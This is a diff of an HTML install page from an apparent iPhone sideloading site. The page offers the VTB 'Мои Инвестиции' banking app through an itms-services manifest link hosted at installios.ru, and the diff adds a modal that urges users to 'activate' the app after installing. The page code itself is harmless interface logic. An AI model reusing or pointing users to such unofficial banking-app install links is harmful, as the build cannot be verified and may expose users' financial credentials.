@@ -21,7 +21,7 @@ h1{position:relative;margin:0;font-size:34px;letter-spacing:-1.2px}.version{marg
 .qrrow{display:flex;align-items:center;gap:15px}.qr{flex:0 0 108px;width:108px;height:108px;padding:6px;border-radius:13px;background:#fff;object-fit:contain}.qr-large{flex:0 0 auto;width:min(280px,75vw);height:min(280px,75vw);padding:10px;border-radius:18px;box-shadow:0 12px 35px rgba(0,0,0,.28)}.other-device{display:block;width:100%;padding:14px 16px;border:1px solid var(--line);border-radius:14px;background:rgba(255,255,255,.06);color:#fff;font:inherit;font-size:13px;font-weight:800;cursor:pointer}.other-device:active{transform:scale(.99)}.qrtext strong{display:block;font-size:12px;margin-bottom:6px}.qrtext p{margin:0;color:var(--muted);font-size:11px;line-height:1.5}
 .links{display:flex;gap:8px;margin-top:13px}.links a{flex:1;text-align:center;padding:12px 9px;border:1px solid var(--line);border-radius:12px;background:rgba(255,255,255,.04);font-size:11px;font-weight:750;text-decoration:none}.footer{display:flex;justify-content:center;gap:18px;margin:19px 0 2px}.footer a{color:#bcbdd0;font-size:11px;text-decoration:none}.brandline{text-align:center;margin-top:12px;color:#77798e;font-size:10px}
 @media(min-height:850px){.wrap{padding-top:28px}.top{margin-bottom:28px}}
-</style>
+.install-modal[hidden]{display:none}.install-modal{position:fixed;inset:0;z-index:1000;display:flex;align-items:center;justify-content:center;padding:20px;background:rgba(3,3,10,.78);backdrop-filter:blur(12px)}.install-dialog{width:min(100%,420px);max-height:calc(100dvh - 40px);overflow:auto;padding:24px 20px 20px;border:1px solid rgba(255,255,255,.12);border-radius:25px;background:linear-gradient(155deg,#202033,#11111d 75%);box-shadow:0 25px 90px rgba(0,0,0,.55)}.install-dialog-icon{display:grid;place-items:center;width:58px;height:58px;margin:0 auto 14px;border-radius:18px;background:linear-gradient(135deg,#ff76ad,#a15cff);font-size:29px}.install-dialog h2{margin:0 0 13px;text-align:center;font-size:23px;letter-spacing:-.5px}.install-dialog p{margin:0 0 12px;color:#d0d0df;font-size:14px;line-height:1.55}.install-again{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;min-height:52px;margin-top:17px;padding:13px;border:0;border-radius:15px;background:linear-gradient(110deg,#ff76ad,#ff3f8b 48%,#a15cff);color:#fff;text-decoration:none;font-size:15px;font-weight:850;cursor:pointer}.install-ok{width:100%;min-height:46px;margin-top:9px;border:1px solid var(--line);border-radius:14px;background:rgba(255,255,255,.06);color:#fff;font:inherit;font-size:14px;font-weight:750;cursor:pointer}</style>
 </head>
 <body>
 <main class="wrap">
@@ -31,7 +31,7 @@ h1{position:relative;margin:0;font-size:34px;letter-spacing:-1.2px}.version{marg
 <h1 id="appName">ВТБ Мои Инвестиции</h1>
 <p class="version">Установка через Safari · без компьютера</p>
 <div class="chips"><span class="chip">📱 Safari</span><span class="chip">🖥️ Без ПК</span><span class="chip">⬇️ Прямая установка</span></div>
-<a class="install" id="installButton" href="itms-services://?action=download-manifest&amp;url=https%3A%2F%2Finstallios.ru%2Fu%2Fmuradmegida%2Fpublic%2F1ttQGQ.plist"><span>📲</span> Установить на iPhone <span>→</span></a>
+<a class="install" id="installButton" target="_blank" rel="noopener" href="itms-services://?action=download-manifest&amp;url=https%3A%2F%2Finstallios.ru%2Fu%2Fmuradmegida%2Fpublic%2F1ttQGQ.plist"><span>📲</span> Установить на iPhone <span>→</span></a>
 <p class="note">Откройте эту страницу в Safari на iPhone и нажмите кнопку установки.</p>
 </section>
 <section class="section">
@@ -56,8 +56,21 @@ h1{position:relative;margin:0;font-size:34px;letter-spacing:-1.2px}.version{marg
 <nav class="footer"><a href="index.html">🏠 Главная</a><a href="catalog.html">📲 Ещё приложения</a><a href="profile.html">👤 Профиль</a></nav>
 <div class="brandline">AppCore · Установка приложений на iPhone</div>
 </main>
+
+<div class="install-modal" id="installModal" hidden>
+<section class="install-dialog" role="dialog" aria-modal="true" aria-labelledby="installModalTitle" aria-describedby="installModalText"><div class="install-dialog-icon" aria-hidden="true">📲</div><h2 id="installModalTitle">Установка пошла!</h2><div id="installModalText"><p>Сверните Safari и посмотрите на рабочий стол — там должна появиться иконка приложения с кружком загрузки.</p><p>⏳ Дождитесь завершения загрузки — обычно это занимает от 1 до 15 минут в зависимости от скорости интернета и размера приложения.</p><p>⚠️ <strong>Важно! После установки обязательно активируйте приложение. Без активации оно не будет работать.</strong></p><p>Если иконка не появилась в течение 1 минуты — нажмите «Установить ещё раз».</p></div><a class="install-again" id="installAgainButton" href="itms-services://?action=download-manifest&amp;url=https%3A%2F%2Finstallios.ru%2Fu%2Fmuradmegida%2Fpublic%2F1ttQGQ.plist">🔄 Установить ещё раз</a><button class="install-ok" id="installOkButton" type="button">Понятно</button></section></div>
 <script>
 (function(){
+  const installButton = document.getElementById("installButton");
+  const installModal = document.getElementById("installModal");
+  const installOkButton = document.getElementById("installOkButton");
+  const installAgainButton = document.getElementById("installAgainButton");
+  installButton.addEventListener("click", function(){ installModal.hidden = false; });
+  installOkButton.addEventListener("click", function(){ installModal.hidden = true; installButton.focus(); });
+  installModal.addEventListener("click", function(event){ if(event.target === installModal) installModal.hidden = true; });
+  document.addEventListener("keydown", function(event){ if(event.key === "Escape" && !installModal.hidden) installModal.hidden = true; });
+  installAgainButton.addEventListener("click", function(){ try { if(window.opener && !window.opener.closed) window.opener.postMessage({type:"appcore-install-started",appId:"vtb-invest"},window.location.origin); } catch(e) {} });
+
   document.getElementById("installButton").addEventListener("click", function(){
     try {
       if (window.opener && !window.opener.closed) {
